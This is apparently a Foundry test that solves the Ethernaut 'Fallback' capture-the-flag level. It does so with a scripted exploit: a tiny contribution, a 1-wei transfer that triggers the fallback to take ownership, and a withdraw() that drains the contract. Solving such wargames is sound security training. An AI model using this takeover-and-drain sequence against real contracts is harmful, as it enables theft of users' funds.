// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

import "ds-test/test.sol";
import "forge-std/vm.sol";
import "forge-std/console.sol";
import "./Fallback.sol";
import "./FallbackHacker.sol";
import "./FallbackFactory.sol";
import "../Ethernaut.sol";
contract FallbackTest {

    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(10);

    function setUp() public {
        vm.deal(eoaAddress, 5 ether);
        // Deal EOA address some ether
        ethernaut = new Ethernaut();
    }

    function testDelegationHack() public {

        /////////////////
        // LEVEL SETUP //
        /////////////////
        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);

        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);

        /////////////////
        // LEVEL HACK  //
        /////////////////
        // FallbackHacker hacker = new FallbackHacker{value: 1 ether}(payable(levelAddress));
        // hacker.attack();


        levelAddress.call{value: 0.0009 ether}(abi.encodeWithSignature("contribute()"));
        levelAddress.call{value: 1 wei}(abi.encodeWithSignature(""));
        levelAddress.call(abi.encodeWithSignature("withdraw()"));

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        assert(levelSuccessfullyPassed);
        vm.stopPrank();

        //forge test --match-path src/Ethernaut/Fallback/FallbackTest.t.sol -vvvv
  }
}
